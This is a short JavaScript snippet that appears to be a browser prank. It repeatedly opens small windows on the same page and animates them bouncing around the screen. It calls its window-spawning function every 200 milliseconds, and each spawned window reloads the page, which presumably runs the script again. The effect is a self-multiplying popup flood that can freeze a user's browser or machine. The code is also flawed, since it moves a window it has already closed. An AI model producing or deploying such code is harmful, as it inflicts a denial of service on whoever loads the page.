function moveWindows() {
  // Create two windows
  var window1 = window.open(location.href, '_blank', 'width=200,height=200');
  var window2 = window.open(location.href, '_blank', 'width=200,height=200');
  window1.close();

  // Set the initial positions and velocities of the windows
  var window1X = 0;
  var window1Y = 0;
  var window1VX = 5;
  var window1VY = 5;

  var window2X = window.innerWidth - 200;
  var window2Y = window.innerHeight - 200;
  var window2VX = -5;
  var window2VY = -5;

  // Move the windows diagonally and make them bounce off the edges
  const frame = function() {
    // Move window 1
    window1X += window1VX;
    window1Y += window1VY;
    window1.moveTo(window1X, window1Y);

    // Move window 2
    window2X += window2VX;
    window2Y += window2VY;
    window2.moveTo(window2X, window2Y);

    // Check if window 1 hits the edges
    if (window1X <= 0 || window1X >= window.innerWidth - 200) {
      window1VX *= -1;
    }
    if (window1Y <= 0 || window1Y >= window.innerHeight - 200) {
      window1VY *= -1;
    }

    // Check if window 2 hits the edges
    if (window2X <= 0 || window2X >= window.innerWidth - 200) {
      window2VX *= -1;
    }
    if (window2Y <= 0 || window2Y >= window.innerHeight - 200) {
      window2VY *= -1;
    }
    requestAnimationFrame(frame)
  }
  frame()
}

// Call the function to start moving the windows
setInterval(() => {
	moveWindows();
}, 200)
